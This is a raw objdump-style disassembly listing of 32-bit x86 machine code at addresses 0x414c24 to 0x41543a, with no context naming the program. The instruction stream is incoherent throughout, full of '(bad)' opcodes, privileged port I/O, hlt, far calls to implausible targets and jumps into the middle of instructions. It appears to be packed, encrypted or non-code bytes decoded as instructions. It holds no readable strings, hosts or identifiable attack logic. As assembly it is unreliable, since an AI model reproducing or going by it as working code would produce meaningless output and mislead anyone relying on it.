  414c24:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  414c2a:	cmp    BYTE PTR [ebx],al
  414c2c:	jne    0x414bb7
  414c2e:	xor    esp,eax
  414c30:	jmp    0x444db3
  414c35:	add    ebp,DWORD PTR [ecx+ecx*4]
  414c38:	jne    0x414c2e
  414c3a:	call   0xffcb4994
  414c3f:	clc    
  414c40:	xchg   edi,eax
  414c41:	sti    
  414c42:	add    DWORD PTR [ebx],eax
  414c44:	add    BYTE PTR [ebp+0x47],bl
  414c47:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  414c4d:	pop    ebp
  414c4e:	mov    DWORD PTR [esi-0x48],esi
  414c51:	jmp    0x414c9a
  414c53:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  414c59:	(bad)  
  414c5b:	cmp    al,0x0
  414c5d:	cmp    eax,DWORD PTR [ebp+0x18]
  414c60:	lea    ebx,[ebp-0x56]
  414c63:	jle    0x414c65
  414c65:	jae    0x414bf0
  414c67:	mov    eax,esp
  414c69:	call   0xb900:0x8b005587
  414c70:	inc    ebp
  414c71:	push   ebp
  414c72:	lea    ecx,[ebp-0x27ff4f12]
  414c78:	mov    eax,edi
  414c7a:	int3   
  414c7b:	push   ebp
  414c7c:	xchg   edi,eax
  414c7e:	add    esp,ebp
  414c80:	add    BYTE PTR [eax],al
  414c82:	inc    ebp
  414c83:	add    BYTE PTR [ebp+0x8b3255],cl
  414c89:	cld    
  414c8a:	mov    DWORD PTR [edx],edi
  414c8c:	aam    0x75
  414c8e:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  414c94:	mov    DWORD PTR [ebx-0x50],edx
  414c97:	test   BYTE PTR [ebp-0x1],0xe8
  414c9b:	mov    eax,DWORD PTR [eax]
  414c9d:	hlt    
  414c9e:	add    al,al
  414ca0:	mov    eax,DWORD PTR ds:0x890045a8
  414ca6:	dec    DWORD PTR [ebx+0x45fdf0e8]
  414cac:	inc    DWORD PTR [eax*2+0xf75854d]
  414cb3:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  414cb9:	call   0x7297a9fa
  414cbe:	je     0x414d1e
  414cc0:	js     0x414d21
  414cc2:	lock ret 0x7e
  414cc6:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  414ccc:	mov    edi,edi
  414cce:	sbb    al,bl
  414cd0:	clc    
  414cd1:	add    BYTE PTR [ebp-0x73],bh
  414cd4:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  414cda:	ror    BYTE PTR [eax],1
  414cdc:	dec    ebp
  414cdd:	xchg   ebp,eax
  414cde:	mov    edi,edi
  414ce0:	in     al,0x8b
  414ce2:	jge    0x414c6d
  414ce4:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  414cea:	clc    
  414ceb:	pop    esi
  414cec:	fist   DWORD PTR [ebp+0x5d398b5d]
  414cf2:	clc    
  414cf3:	add    al,0x6e
  414cf5:	mov    eax,DWORD PTR [ebx]
  414cf7:	mov    BYTE PTR [ebp+0x0],dl
  414cfa:	mov    edx,DWORD PTR [ebx-0x20]
  414cfd:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  414d03:	add    eax,0x3b3b73
  414d08:	adc    al,0x89
  414d0a:	pop    eax
  414d0b:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  414d0f:	ret    0xf08
  414d12:	cmp    al,0x2
  414d14:	mov    edx,eax
  414d16:	cld    
  414d17:	add    BYTE PTR [ebp+0x66],dl
  414d1a:	add    eax,ebx
  414d1c:	add    esp,eax
  414d1e:	sub    eax,eax
  414d20:	or     BYTE PTR [ecx-0x77f474bb],cl
  414d26:	add    BYTE PTR [eax],al
  414d28:	mov    DWORD PTR [ebx-0x24],ebx
  414d2b:	push   edi
  414d2c:	push   ebp
  414d2d:	clc    
  414d2e:	add    DWORD PTR [esi+0x1b0100],0x45
  414d35:	out    0xff,eax
  414d37:	add    edx,DWORD PTR [eax]
  414d39:	jmp    0x414d23
  414d3b:	cmp    ch,0x47
  414d3e:	(bad)  
  414d3f:	jmp    0x40c6d591
  414d44:	je     0x414cd0
  414d46:	mov    eax,DWORD PTR [eax-0x10c78f04]
  414d4c:	inc    ebp
  414d4d:	add    BYTE PTR [ebx-0x770375],al
  414d53:	add    ah,ch
  414d55:	add    edx,esp
  414d57:	pop    edi
  414d58:	pop    ebp
  414d59:	push   ebp
  414d5a:	inc    ebx
  414d5b:	in     al,dx
  414d5c:	pop    ebp
  414d5d:	in     al,dx
  414d5e:	cmp    edx,DWORD PTR [edi-0x8]
  414d61:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  414d68:	add    al,0x47
  414d6a:	push   ebp
  414d6b:	mov    esp,ebp
  414d6d:	in     al,0x45
  414d6f:	dec    ebp
  414d70:	push   esi
  414d71:	test   DWORD PTR [eax+0xfb010f],esi
  414d77:	add    BYTE PTR [eax+0xc018b],dh
  414d7d:	leave  
  414d7e:	inc    ebp
  414d7f:	test   al,ch
  414d81:	add    dh,bh
  414d83:	add    bh,bh
  414d85:	dec    ebp
  414d86:	push   cs
  414d87:	mov    DWORD PTR [ecx],eax
  414d89:	hlt    
  414d8a:	push   es
  414d8b:	dec    ebp
  414d8c:	leave  
  414d8d:	mov    DWORD PTR [eax],ecx
  414d8f:	clc    
  414d90:	cmovge eax,ecx
  414d93:	mov    ecx,0x85c2f0
  414d99:	clc    
  414d9a:	pop    DWORD PTR [ebp+0x1]
  414d9d:	push   ebx
  414d9e:	add    BYTE PTR [ebp-0x15],bh
  414da1:	push   esi
  414da2:	xor    eax,0x898a45
  414da7:	cld    
  414da8:	add    al,0x45
  414daa:	add    BYTE PTR [ebx],dh
  414dac:	pushfw 
  414dae:	add    DWORD PTR [esi+0x78308c1],edi
  414db4:	add    ah,BYTE PTR [edi+esi*4-0x33]
  414db8:	mov    ebx,0xc4e8b
  414dbd:	(bad)  
  414dbe:	cmp    ecx,ebx
  414dc0:	jne    0x414d8a
  414dc2:	xor    ecx,DWORD PTR [ebp+0x66]
  414dc5:	jmp    0xc84dcb
  414dca:	add    DWORD PTR [ebp+0x0],eax
  414dcd:	mov    eax,ebx
  414dcf:	or     al,0x8b
  414dd1:	(bad)  
  414dd2:	mov    ecx,esi
  414dd4:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  414ddb:	mov    eax,edi
  414ddd:	or     BYTE PTR [edx],cl
  414ddf:	shl    cl,cl
  414de1:	icebp  
  414de2:	add    BYTE PTR [ebp+0x37],0x8b
  414de6:	or     BYTE PTR [edx+eax*2],cl
  414de9:	(bad)  
  414dea:	or     cl,dh
  414dec:	stc    
  414ded:	shl    DWORD PTR [ebp-0x30],0xc6
  414df1:	xor    al,0x0
  414df3:	inc    ebp
  414df4:	xchg   BYTE PTR [ebx],al
  414df6:	add    esp,edi
  414df8:	add    BYTE PTR [ebp-0x39],cl
  414dfb:	mov    al,bl
  414dfd:	test   DWORD PTR [ebx+0x1c348375],ecx
  414e03:	sub    al,0xbf
  414e05:	jmp    0x414d8c
  414e07:	mov    edi,eax
  414e09:	lock jge 0x414dfd
  414e0c:	lea    esi,[edx-0x74bad501]
  414e12:	mov    ebp,esp
  414e14:	or     cl,dh
  414e16:	leave  
  414e17:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  414e1e:	dec    ebp
  414e1f:	dec    ebp
  414e20:	test   DWORD PTR [ebx],eax
  414e22:	paddb  mm6,mm0
  414e25:	add    DWORD PTR [eax],eax
  414e27:	dec    ebp
  414e28:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  414e2e:	mov    esi,DWORD PTR [edx]
  414e30:	or     al,0x2b
  414e32:	dec    ebp
  414e33:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  414e39:	mov    esp,esi
  414e3b:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  414e42:	mov    DWORD PTR [ebx],ebp
  414e44:	call   0xc74d774
  414e49:	mov    DWORD PTR [ebp+0x10],ecx
  414e4c:	(bad)  
  414e4d:	push   0x8b85ff10
  414e52:	clc    
  414e53:	or     al,0x55
  414e55:	(bad)  
  414e56:	push   ecx
  414e57:	retf   
  414e58:	mov    ebx,0xff4d8dc8
  414e5d:	mov    DWORD PTR [ebp+0x8],eax
  414e60:	xor    eax,DWORD PTR [ebp-0x75]
  414e63:	cmp    ebp,DWORD PTR [ebx]
  414e65:	lsl    ebx,WORD PTR [edi-0x8]
  414e69:	call   DWORD PTR [ebx-0x741bff75]
  414e6f:	(bad)  
  414e70:	or     al,0x5b
  414e72:	dec    ebp
  414e73:	or     BYTE PTR [ebx],dh
  414e75:	inc    ebp
  414e76:	xor    esi,DWORD PTR ds:0x708088d
  414e7c:	in     eax,0x9c
  414e7e:	add    BYTE PTR [edx],dh
  414e80:	inc    ebp
  414e81:	pop    edi
  414e82:	xor    eax,edx
  414e84:	test   DWORD PTR [eax],0x83108b8b
  414e8a:	dec    ebp
  414e8b:	adc    al,0x33
  414e8d:	inc    ebp
  414e8e:	xor    esi,DWORD PTR [ecx]
  414e90:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  414e97:	test   DWORD PTR [eax],ecx
  414e99:	clc    
  414e9a:	inc    ebp
  414e9b:	add    ecx,DWORD PTR [ebx+0xc7f445]
  414ea1:	hlt    
  414ea2:	leave  
  414ea3:	test   DWORD PTR [esi],eax
  414ea5:	clc    
  414ea6:	inc    edi
  414ea7:	push   edi
  414ea8:	aaa    
  414ea9:	inc    ebp
  414eaa:	pop    ss
  414eab:	ror    DWORD PTR [ebp-0x29],1
  414eae:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  414eb5:	mov    eax,0x780084d
  414eba:	push   ebp
  414ebb:	clc    
  414ebc:	ret    0xe99c
  414ebf:	xor    dl,dl
  414ec1:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  414ec7:	js     0x887dac6
  414ecd:	dec    ebp
  414ece:	push   ebp
  414ecf:	mov    edi,DWORD PTR [eax+0xc872fc]
  414ed5:	lock enter 0xceca,0xf2
  414eda:	retf   0x18ce
  414edd:	jne    0x414f2c
  414edf:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  414ee5:	enter  0xf0d6,0xca
  414ee9:	retf   0xf2c8
  414eec:	into   
  414eed:	out    dx,al
  414eee:	dec    ebp
  414eef:	dec    ebp
  414ef0:	jmp    0xff454e28
  414ef5:	xor    eax,DWORD PTR [ebp-0x15]
  414ef8:	xor    esi,DWORD PTR [ebx]
  414efa:	mov    esi,DWORD PTR [ebx]
  414efc:	sub    eax,DWORD PTR [ebx]
  414efe:	add    eax,DWORD PTR [ebx]
  414f00:	or     bl,dl
  414f02:	dec    ebp
  414f03:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  414f09:	xor    eax,DWORD PTR [ebp-0xf00073]
  414f0f:	jb     0x414f56
  414f11:	add    BYTE PTR [ebx],dh
  414f13:	dec    ebp
  414f14:	pop    esi
  414f15:	mov    ebp,ebx
  414f17:	cld    
  414f18:	mov    esi,eax
  414f1a:	call   0x520fa4e7
  414f1f:	stc    
  414f20:	add    eax,0x4572aa
  414f25:	pop    edi
  414f26:	leave  
  414f27:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  414f2e:	in     al,dx
  414f2f:	mov    eax,edi
  414f31:	xor    eax,0xf8008520
  414f37:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  414f3e:	mov    eax,DWORD PTR [ebp-0x77]
  414f41:	xor    al,bh
  414f43:	pushf  
  414f44:	inc    ebp
  414f45:	(bad)  
  414f46:	cmp    eax,ebp
  414f48:	pushf  
  414f49:	xchg   BYTE PTR [esi-0x8],dl
  414f4c:	mov    edi,0x8518e4ec
  414f52:	jmp    0xf056:0x8b457df8
  414f59:	push   ebp
  414f5a:	push   ebp
  414f5b:	push   ecx
  414f5c:	push   ecx
  414f5d:	push   edi
  414f5e:	xor    eax,esi
  414f60:	mov    edx,0x32729c
  414f65:	add    ecx,eax
  414f67:	mov    edx,edi
  414f69:	clc    
  414f6a:	retf   0xaf45
  414f6d:	cmp    ebx,ebp
  414f6f:	pushf  
  414f70:	mov    eax,edi
  414f72:	clc    
  414f73:	cld    
  414f74:	jne    0x414f8e
  414f76:	xor    ebp,edx
  414f78:	xor    eax,DWORD PTR [ebp+0x3]
  414f7b:	or     BYTE PTR [ebx],al
  414f7d:	add    BYTE PTR [ebp-0x7747475],al
  414f83:	hlt    
  414f84:	dec    ebp
  414f85:	dec    ebp
  414f86:	je     0x414fbb
  414f88:	xor    esi,DWORD PTR [ebx]
  414f8a:	xor    eax,DWORD PTR [ebx]
  414f8c:	add    eax,DWORD PTR [ebx]
  414f8e:	add    ecx,DWORD PTR [edi]
  414f90:	rol    ecx,cl
  414f92:	mov    esi,DWORD PTR [ecx]
  414f94:	in     al,dx
  414f95:	inc    ebp
  414f96:	enter  0xca2b,0x33
  414f9a:	icebp  
  414f9b:	mov    DWORD PTR [edx],ecx
  414f9d:	clc    
  414f9e:	lock pop ebp
  414fa0:	enter  0xf2e8,0xfe
  414fa4:	retf   0xeeff
  414fa7:	inc    ebp
  414fa8:	jne    0x414f35
  414faa:	mov    edi,eax
  414fac:	cld    
  414fad:	dec    ebp
  414fae:	enter  0xbc89,0x8d
  414fb2:	pushf  
  414fb3:	sti    
  414fb4:	xor    bh,bh
  414fb6:	mov    eax,DWORD PTR [ebp-0xc]
  414fb9:	mov    esi,DWORD PTR [ebp-0x4]
  414fbc:	xor    eax,esi
  414fbe:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  414fc5:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  414fcb:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  414fd1:	(bad)  
  414fd2:	push   ebp
  414fd3:	shr    esp,0x4d
  414fd6:	in     al,dx
  414fd7:	cmp    eax,DWORD PTR [esi+esi*2]
  414fda:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  414fe0:	pushf  
  414fe1:	mov    edi,0x85c7f445
  414fe7:	call   0xf886d6e4
  414fec:	xor    ebx,ebx
  414fee:	pushf  
  414fef:	popa   
  414ff0:	push   ebx
  414ff1:	dec    ebp
  414ff2:	inc    ebp
  414ff3:	mov    esi,DWORD PTR [esi]
  414ff5:	clc    
  414ff6:	pushf  
  414ff7:	into   
  414ff8:	mov    ecx,edi
  414ffa:	in     al,dx
  414ffb:	call   0x8b4995be
  415000:	pop    es
  415001:	or     BYTE PTR [ebx],dh
  415003:	or     BYTE PTR [edi+0x8a724d],bh
  415009:	or     eax,edi
  41500b:	push   ebp
  41500c:	inc    ebp
  41500d:	cmpxchg8b (bad)
  41500e:	(bad)  
  41500f:	leave  
  415010:	loopne 0x414fdc
  415012:	test   DWORD PTR [ebp-0x8],ecx
  415015:	mov    eax,DWORD PTR [ebp-0x18]
  415018:	rcl    DWORD PTR [ebp-0x29],1
  41501b:	xor    eax,edi
  41501d:	add    esi,eax
  41501f:	and    eax,DWORD PTR [eax]
  415021:	mov    eax,DWORD PTR [eax]
  415023:	(bad)  
  415024:	leave  
  415025:	sti    
  415026:	inc    ebp
  415027:	dec    DWORD PTR [ebx-0x39cc13ab]
  41502d:	mov    esi,ecx
  41502f:	clc    
  415030:	(bad)  
  415031:	dec    ebp
  415032:	iret   
  415033:	xor    ebp,DWORD PTR [edi-0x74f71473]
  415039:	jb     0x415037
  41503b:	add    bh,al
  41503d:	inc    ebp
  41503e:	(bad)  
  41503f:	mov    eax,DWORD PTR [ebp-0xc]
  415042:	(bad)  
  415043:	xabort 0x64
  415046:	loopne 0x415015
  415048:	jmp    FWORD PTR [ebx]
  41504a:	mov    DWORD PTR [ebx],eax
  41504c:	clc    
  41504d:	lock inc ebp
  41504f:	dec    ebp
  415050:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  415056:	loopne 0x41508b
  415058:	inc    DWORD PTR [ebx]
  41505a:	mov    edi,DWORD PTR [ebx]
  41505c:	hlt    
  41505d:	jne    0x4150ac
  41505f:	mov    esi,DWORD PTR [ebx]
  415061:	in     al,0x8d
  415063:	dec    ebp
  415064:	or     BYTE PTR [ebx],dh
  415066:	jb     0x41506b
  415068:	add    BYTE PTR [edi+0x45],bl
  41506b:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  415071:	add    BYTE PTR [ebx],dh
  415073:	mov    esi,DWORD PTR [ebx]
  415075:	sub    DWORD PTR [ebx],0x6c
  415078:	mov    eax,DWORD PTR [ebp-0x4]
  41507b:	xor    eax,ecx
  41507d:	pushf  
  41507e:	mov    ecx,0x338545ba
  415083:	clc    
  415084:	add    edx,DWORD PTR [ebp-0x77]
  415087:	mov    edi,eax
  415089:	adc    al,0x45
  41508b:	inc    ebp
  41508c:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  415094:	mov    eax,DWORD PTR [eax]
  415096:	loopne 0x4150e5
  415098:	inc    ebp
  415099:	mov    esi,DWORD PTR [ebx]
  41509b:	mov    eax,DWORD PTR [ebx]
  41509d:	nop
  41509e:	rol    DWORD PTR [eax],cl
  4150a0:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  4150a6:	mov    cl,BYTE PTR [ecx+0x450bf888]
  4150ac:	dec    ebp
  4150ad:	push   esi
  4150ae:	mov    edi,DWORD PTR [edi+0x7b608f8]
  4150b4:	xor    eax,edi
  4150b6:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  4150bd:	mov    DWORD PTR [eax],ecx
  4150bf:	in     al,dx
  4150c0:	into   
  4150c1:	inc    ebp
  4150c2:	iret   
  4150c3:	xor    ecx,edx
  4150c5:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  4150cc:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  4150d2:	dec    ebp
  4150d3:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  4150d9:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  4150e0:	mov    DWORD PTR [ecx+0x8],eax
  4150e3:	mov    eax,DWORD PTR [ebp-0x8]
  4150e6:	xor    ebx,DWORD PTR [eax]
  4150e8:	mov    ecx,0xff8b8d40
  4150ed:	clc    
  4150ee:	enter  0x4d49,0x48
  4150f2:	mov    eax,edx
  4150f4:	lock enter 0x4545,0x8b
  4150f9:	mov    esi,eax
  4150fb:	cmp    dh,al
  4150fd:	rol    edi,0x3
  415100:	enter  0x9140,0x89
  415104:	inc    ebp
  415105:	adc    al,0x8b
  415107:	inc    ebp
  415108:	clc    
  415109:	xor    eax,esi
  41510b:	add    eax,edi
  41510d:	mov    DWORD PTR [esi-0x24],ebx
  415110:	rol    DWORD PTR [ebp-0x37],0x33
  415114:	add    al,0x3
  415116:	push   ebp
  415117:	mov    esp,ebp
  415119:	fsubr  st,st(4)
  41511b:	inc    ebp
  41511c:	(bad)  
  41511d:	mov    edi,esp
  41511f:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  415125:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41512c:	inc    ebp
  41512d:	test   DWORD PTR [ecx+0x454514f8],ecx
  415133:	xor    cl,BYTE PTR [ebx+0xc7909c]
  415139:	fmul   DWORD PTR [ebx+0xf81485]
  41513f:	test   DWORD PTR [ecx+0x8b0100],ecx
  415145:	cld    
  415146:	or     edi,eax
  415148:	dec    eax
  415149:	ret    
  41514a:	push   ebx
  41514b:	inc    ebp
  41514c:	dec    ebp
  41514d:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  415153:	mov    DWORD PTR [ebp-0x14],edx
  415156:	push   ecx
  415157:	jne    0x41518c
  415159:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41515f:	call   0xff874327
  415164:	mov    eax,DWORD PTR [ebp-0x4]
  415167:	mov    edi,0x4585c3d8
  41516d:	clc    
  41516e:	mov    eax,DWORD PTR [ebp-0x8]
  415171:	xor    eax,DWORD PTR [eax+0x3]
  415174:	adc    DWORD PTR [eax+0xc],0x45
  415178:	inc    ebp
  415179:	push   eax
  41517a:	mov    ebx,ebp
  41517c:	clc    
  41517d:	inc    DWORD PTR [eax-0x75]
  415180:	mov    esi,eax
  415182:	clc    
  415183:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41518a:	je     0x41518f
  41518c:	mov    edx,DWORD PTR [eax+0x38]
  41518f:	jne    0x4151de
  415191:	lea    ecx,[ebx-0x817ab44]
  415197:	mul    BYTE PTR [ebx]
  415199:	dec    DWORD PTR [ebx+0x4089f845]
  41519f:	fadd   DWORD PTR [ebx]
  4151a1:	inc    ebp
  4151a2:	jmp    0x41512f
  4151a4:	mov    ecx,DWORD PTR [esp+edx*2]
  4151a7:	rol    DWORD PTR [ebp+0x45],0x8b
  4151ab:	mov    edi,esp
  4151ad:	lock (bad) 
  4151af:	dec    ebp
  4151b0:	ret    
  4151b1:	mov    eax,DWORD PTR [ebp+0x10]
  4151b4:	mov    eax,DWORD PTR [ecx-0x4]
  4151b7:	mov    eax,edi
  4151b9:	fadd   st,st(3)
  4151bb:	enter  0x1645,0x8b
  4151bf:	inc    ebp
  4151c0:	cld    
  4151c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4151c4:	xor    ecx,DWORD PTR [ebp+0x3]
  4151c7:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  4151cd:	sub    eax,DWORD PTR [ebp-0x17]
  4151d0:	xor    eax,DWORD PTR [edx]
  4151d2:	pushf  
  4151d3:	add    bh,al
  4151d5:	or     al,0xd8
  4151d7:	jne    0x41515e
  4151d9:	(bad)  
  4151da:	clc    
  4151db:	mov    al,0x45
  4151dd:	call   0xffde481f
  4151e2:	jmp    0xdd5518
  4151e7:	mov    DWORD PTR [ebp-0x30],eax
  4151ea:	xor    eax,DWORD PTR [ebp+0x3]
  4151ed:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  4151f3:	enter  0x8503,0xc
  4151f7:	clc    
  4151f8:	inc    ebp
  4151f9:	inc    ebp
  4151fa:	push   DWORD PTR [edx]
  4151fc:	in     al,dx
  4151fd:	pushf  
  4151fe:	jne    0x41518d
  415200:	mov    edx,eax
  415202:	clc    
  415203:	dec    ebp
  415204:	out    dx,eax
  415205:	(bad)  
  415206:	dec    esp
  415208:	mov    DWORD PTR [ebp-0x10],ecx
  41520b:	lea    eax,[ebp-0x38]
  41520e:	cmp    DWORD PTR [ebp-0x64],ecx
  415211:	lea    ecx,[ebx-0x38b2273c]
  415217:	mov    eax,ebx
  415219:	cld    
  41521a:	(bad)  
  41521b:	iret   
  41521c:	mov    esp,0xf74de8cb
  415221:	jmp    0x865425
  415226:	test   DWORD PTR [ebx],esi
  415228:	je     0x4151c6
  41522a:	mov    ecx,DWORD PTR [edi]
  41522c:	fdivr  st,st(6)
  41522e:	mov    DWORD PTR [eax],0xe8ff8bc3
  415234:	lock iret 
  415236:	inc    ebp
  415237:	lock push eax
  415239:	retf   
  41523a:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  415241:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  415248:	dec    ebp
  415249:	mov    DWORD PTR [ebx],ebp
  41524b:	fmul   DWORD PTR [ecx+0x458bd845]
  415251:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  415257:	enter  0x1303,0xc
  41525b:	inc    ebp
  41525c:	dec    ebp
  41525d:	xor    edi,DWORD PTR [ebx]
  41525f:	add    esi,DWORD PTR [edx+0x50]
  415262:	mov    ecx,DWORD PTR [eax+esi*8]
  415265:	inc    ebp
  415266:	inc    eax
  415267:	push   eax
  415268:	mov    ebp,esp
  41526a:	lock inc DWORD PTR [ecx-0x75]
  41526e:	mov    esp,esp
  415270:	fadd   DWORD PTR [eax]
  415272:	rol    edi,0xee
  415275:	test   BYTE PTR [eax],al
  415277:	dec    esp
  415278:	push   0x32
  41527a:	dec    DWORD PTR [ebx-0x30ba0314]
  415280:	push   eax
  415281:	mov    dh,0x21
  415283:	add    edi,edi
  415285:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41528b:	add    BYTE PTR [ebp-0x75],al
  41528e:	(bad)  
  41528f:	loopne 0x41525d
  415291:	add    BYTE PTR [ebp+0x4584f8c7],al
  415297:	dec    esp
  415298:	xor    esi,DWORD PTR [edx]
  41529a:	pushf  
  41529b:	mov    eax,edi
  41529d:	cld    
  41529e:	(bad)  
  41529f:	iret   
  4152a0:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4152a6:	mov    DWORD PTR [edi],ecx
  4152a8:	in     al,0x58
  4152aa:	dec    ebp
  4152ab:	add    BYTE PTR [ecx+0x4df0e08b],cl
  4152b1:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  4152b7:	dec    esp
  4152b8:	mov    DWORD PTR [edx],esi
  4152ba:	fmul   QWORD PTR [ebx-0x30cc03b3]
  4152c0:	add    esi,DWORD PTR [esi+0x3bd80389]
  4152c6:	test   DWORD PTR [edi],0x3d3800
  4152cc:	test   DWORD PTR [ebx+0x84dcf8],ecx
  4152d2:	add    edi,eax
  4152d4:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  4152db:	mov    eax,DWORD PTR [ebx]
  4152dd:	cld    
  4152de:	mov    edi,ecx
  4152e0:	hlt    
  4152e1:	mov    dh,0x45
  4152e3:	add    esi,DWORD PTR [ebx]
  4152e5:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	mov    eax,DWORD PTR [ebp-0x20]
  4152f0:	mov    eax,DWORD PTR [eax]
  4152f2:	call   0x33c5a0be
  4152f7:	dec    esp
  4152f8:	add    esi,DWORD PTR [edx]
  4152fa:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  415300:	cld    
  415301:	iret   
  415302:	(bad)  
  415303:	mov    ebx,es
  415305:	dec    esp
  415306:	push   0x32
  415308:	lea    esi,[edx]
  41530a:	mov    al,0x8b
  41530c:	call   0xff4b4e01
  415311:	iret   
  415312:	inc    ebp
  415313:	mov    WORD PTR [ebx-0x75cdccb4],cs
  415319:	or     al,BYTE PTR ds:0xe4728b
  41531f:	or     DWORD PTR [ebp-0x31],ecx
  415322:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  415329:	cmp    al,cl
  41532b:	je     0x415505
  415331:	mov    eax,DWORD PTR [ebp-0x10]
  415334:	mov    eax,DWORD PTR [eax]
  415336:	xor    eax,edi
  415338:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41533f:	mov    ecx,DWORD PTR [ebp-0x20]
  415342:	xor    ecx,DWORD PTR [ecx]
  415344:	bswap  edi
  415346:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41534e:	add    DWORD PTR [ebx+0x945dc00],ecx
  415354:	mov    ecx,edi
  415356:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41535d:	or     al,BYTE PTR [eax]
  41535f:	mov    ecx,DWORD PTR [ebp-0x20]
  415362:	xor    ecx,DWORD PTR [ecx]
  415364:	bswap  edi
  415366:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41536e:	add    DWORD PTR [edi],ecx
  415370:	add    BYTE PTR [eax-0x7474ffbb],dl
  415376:	xor    ebx,esp
  415378:	mov    al,BYTE PTR [eax]
  41537a:	add    eax,0x8472c7
  41537f:	dec    esp
  415380:	dec    ebp
  415381:	xor    dh,BYTE PTR [ebx]
  415383:	mov    ecx,DWORD PTR [edi]
  415385:	lock ror BYTE PTR [ecx],0xcb
  415389:	iret   
  41538a:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  415392:	inc    ebp
  415393:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  415399:	iret   
  41539a:	add    eax,0x4c728c
  41539f:	xor    cl,BYTE PTR [ebp+0xa]
  4153a2:	mov    ecx,DWORD PTR [ebx+0x98af033]
  4153a8:	or     eax,0x8c72cf
  4153ad:	push   eax
  4153ae:	shl    DWORD PTR [edx],0x4d
  4153b1:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4153b7:	fmul   QWORD PTR ds:0xc77200
  4153bd:	test   cl,al
  4153bf:	dec    esp
  4153c0:	dec    ebp
  4153c1:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  4153c7:	or     DWORD PTR ds:0x8c72cf,ecx
  4153cd:	dec    esp
  4153ce:	enter  0x8532,0x32
  4153d2:	add    BYTE PTR [ebx+0x945e000],cl
  4153d8:	mov    ecx,edi
  4153da:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  4153e1:	or     al,BYTE PTR [eax]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x24]
  4153e6:	mov    ecx,DWORD PTR [ecx]
  4153e8:	xor    ecx,edi
  4153ea:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  4153f1:	cmp    al,cl
  4153f3:	jne    0x415442
  4153f5:	lea    ecx,[ebx-0x7517cc50]
  4153fb:	sti    
  4153fc:	or     eax,0x4d72ff
  415401:	cmp    eax,ecx
  415403:	je     0x415452
  415405:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41540b:	ret    
  41540c:	or     eax,0x8b7245
  415411:	call   0x84c71bde
  415416:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41541d:	mov    esi,DWORD PTR [ebx]
  41541f:	cld    
  415420:	mov    dl,BYTE PTR [ebp+0x5]
  415423:	xor    esi,DWORD PTR [edx+0x3]
  415426:	add    BYTE PTR [ebx],bh
  415428:	dec    ebp
  415429:	jnp    0x8b408826
  41542f:	mov    ecx,DWORD PTR ds:0x4d72fc
  415435:	xor    eax,ecx
  415437:	add    ecx,DWORD PTR [ebp+0x3b]
  41543a:	mov    esi,DWORD PTR [ebp+0x33]
